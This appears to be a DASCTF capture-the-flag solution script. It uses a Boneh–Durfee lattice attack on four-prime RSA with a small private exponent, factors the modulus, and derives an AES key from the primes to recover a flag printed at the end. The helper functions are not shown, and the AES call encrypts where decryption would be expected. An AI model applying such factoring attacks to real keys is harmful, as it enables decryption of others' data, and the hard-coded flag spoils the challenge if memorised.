def attack(N, e, factor_bit_length, factors, delta=0.25, m=1):
    x, y = ZZ["x", "y"].gens()
    A = N + 1
    f = x * (A + y) + 1
    X = int(RR(e) ** delta)
    Y = int(2 ** ((factors - 1) * factor_bit_length + 1))
    t = int((1 - 2 * delta) * m)
    x0, y0 = boneh_durfee(f, e, m, t, X, Y)
    z = int(f(x0, y0))
    if z % e == 0:
        phi = N +int(y0) + 1
        factors = factorize_multi_prime(N, phi)
        if factors:
            return factors

    return None


n = 12778528771742949806245151753869219326103790041631995252034948773711783128776305944498756929732298934720477166855071150429382343090525399073032692529779161146622028051975895639274962265063528372582516292055195313063685656963925420986244801150981084581230336100629998038062420895185391922920881754851005297105551156140379014123294775868179867798105218243424339964238809811837555910593108364135245826360599234594626605066012137694272914693621191616641820375665250179042481908961611154276842449520816511946371478115661488114557201063593848680402471689545509362224765613961509436533468849519328376263878041094637028661183
e = 4446726708272678112679273197419446608921686581114971359716086776036464363243920846432708647591026040092182012898303795518854800856792372040517828716881858432476850992893751986128026419654358442725548028288396111453301336112088168230318117251893266136328216825852616643551255183048159254152784384133765153361821713529774101097531224729203104181285902533238977664673240372553695106609481661124179618839909468411817548602076934523684639875632950838463168454592213740967654900802801128243623511466324869786575827161573559009469945330622017702786149269513046331878690768979142927851424854919322854779975658914469657308779
c = b'_\xf7\x16\x00S\x11\xd5\xec\x94+>\x98\x91\x8b\xaeC\xadV3\xf8\x07a\x95\xf6rr\x86\xd4\x1e\x1b\xe7\xf4H\xa0\xd9\x9b\xb5\x05.u\x08\x80\x04\x8d\xee\xec\x98\xf5'
p, q, r, s = attack(n, e, 512, 4, 0.127, 10)
key = hashlib.md5(str(p + q + r + s).encode()).digest()
aes = AES.new(key, mode=AES.MODE_ECB)
print(aes.encrypt(c))
# DASCTF{d4d0b2c4-b41d-4ce1-871a-b08325900b30}
```

